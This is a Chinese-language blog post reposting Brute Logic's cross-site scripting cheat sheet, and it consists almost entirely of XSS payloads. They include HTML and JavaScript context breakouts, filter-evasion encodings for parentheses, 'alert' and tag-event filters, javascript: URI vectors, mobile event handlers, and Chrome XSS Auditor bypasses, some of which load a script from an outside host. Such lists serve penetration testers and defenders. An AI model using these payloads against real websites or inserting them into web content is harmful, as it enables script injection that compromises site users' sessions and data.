---
layout:		post
title:		XSS Cheat Sheat
subtitle:	
data:		2016-07-22
author:		"dogewatch"
header-img:	"img/contact-bg.jpg"
tags:
    - web
---

> 转自http://brutelogic.com.br/blog/cheat-sheet/

# HTML标签注入
```<svg onload=alert(1)>```

```"><svg onload=alert(1)//```

# HTML标签内注入
```onmouseover=alert(1)//```

```autofocus/onfocus=alert(1)//```

# Javascript代码段注入
```'-alert(1)-'```

```'-alert(1)//```

```\'-alert(1)//```

# Jacascript代码段标签注入
```</script><svg onload=alert(1)>```

# PHP _SELF注入
```http://DOMAIN/PAGE.php/"><svg onload=alert(1)>```

# 绕过圆括号过滤
```<svg onload=alert`1`>```

```<svg onload=alert&lpar;1&rpar;>```

```<svg onload=alert&#28;1&#x29>```

```<svg onload=alert&#40;1&#41>```

# 绕过对alert(1)的过滤
```(alert)(1)```

```a=alert,a(1)```

```[1].find(alert)```

```top["al"+"ert"](1)```

```top[/al/.source+/ert/.source](1)```

```al\u0065rt(1)```

```top['al\145rt'](1)```

```top['al\x65rt'](1)```

```top[8680439..toString(30)](1)```

# Body 标签
```<body onload=alert(1)>```

```<body onpageshow=alert(1)>```

```<body onfocus=alert(1)>```

```<body onhashchage=alert(1)><a href=#x>click this!#x```

```<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x```

```<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x```

```<body onresize=alert(1)>press F12!```

```<body onhelp=alert(1)>press F1! (MSIE)```

# 其他攻击向量
```<marquee onstart=alert(1)>```

```<marquee loop=1 width=0 onfinish=alert(1)>```

```<audio src onloadstart=alert(1)>```

```<video onloadstart=alert(1)><source>```

```<input autofocus onblur=alert(1)>```

```<keygen autofocus onfocus=alert(1)>```

```<form onsubmit=alert(1)><input type=submit>```

```<select onchange=alert(1)><option1>1<option>2```

```<menu id=x contextmenu=x onshow=alert(1)>right click me!```

# 自定义标签执行js

```<x ontenteditable onblur=alert(1)>lose focus!```

```<x onclick=alert(1)>click this!```

```<x oncopy=alert(1)>copy this!```

```<x oncontextmenu=alert(1)>right click this!```

```<x oncut=alert(1)>copy this!```

```<x ondblclick=alert(1)>double click this!```

```<x ondrag=alert(1)>drag this!```

```<x contenteditable onfocus=alert(1)>focus this!```

```<x contenteditable oninput=alert(1)>input here! ```

```<x contenteditable onkeydown=alert(1)>press any key!```

```<x contenteditable onkeypress=alert(1)>press any key!```

```<x contenteditable onkeyup=alert(1)>press any key!```

```<x onmousedown=alert(1)>click this!```

```<x onmousemove=alert(1)>hover this!```

```<x onmouseout=alert(1)>hover this!```

```<x onmouseover=alert(1)>hover this!```

```<x onmouseup=alert(1)>click this!```

```<x contenteditable onpaste=alert(1)>paste here!```

# 复用```</script>```标签
```<script>alert(1)//```

```<script>alert(1)<!--```

# 绕过对标签＋事件的过滤
```%3Cx onxxx=1```|||```<%78 onxxx=1```|||```<x %6Fnxxx=1```|||```<x o%6Exxx=1```|||```<x on%78xx=1```|||```<x onxxx%3D1```|||```<X onxxx=1```|||```<x OnXxx=1```|||```<X OnXxx=1```|||```<x onxxx=1 onxxx=1```|||```<x/onxxx=1```|||```<x%09onxxx=1```|||```<x%0Aonxxx=1```|||```<x%0Conxxx=1```|||```<x%0Donxxx=1```|||```<x%2Fonxxx=1```|||```<x 1='1'onxxx=1```|||```<x 1="1"onxxx=1```|||```<[S]x onx[S]xx=1 [S] = stripped char or string```|||```<x </onxxx=1```|||```<x 1=">" onxxx=1```|||```<http://onxxx%3D1/```

# 绕过不能使用onxxx方法的限制
```<script>alert(1)</script>```

```<script src=javascript:alert(1)>```

```<iframe src=javascript:alert(1)>```

```<embed src=javascript:alert(1)>```

```<a href=javascript:alert(1)>click```

```<math><brute href=javascript:alert(1)>click```

```<form action=javascript:alert(1)><input type=submit>```

```<isindex action=javascript:alert(1) type=submit value=click>```

```<form><button formaction=javascript:alert(1)>click```

```<form><input formaction=javascript:alert(1) type=submit value=click>```

```<form><input formaction=javascript:alert(1) type=image value=click>```

```<form><input formaction=javascript:alert(1) type=image src=SOURCE>```

```<isindex formaction=javascript:alert(1) type=submit value=click>```

```<object data=javascript:alert(1)>```

```<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>```

```<svg><script xlink:href=data:,alert(1) />```

```<math><brute xlink:href=javascript:alert(1)>click```

```<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>```

# 适用于移动设备的攻击向量
```<html ontouchstart=alert(1)>```

```<html ontouchend=alert(1)>```

```<html ontouchmove=alert(1)>```

```<html ontouchcancel=alert(1)>```

```<body onorientationchange=alert(1)>```

# chrome auditor绕过
```<script src="data:&comma;alert(1)//```

```"><script src=data:&comma;alert(1)//```

```<script src="//brutelogic.com.br&sol;1.js&num;```

```"><script src=//brutelogic.com.br&sol;1.js&num;```

```<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;```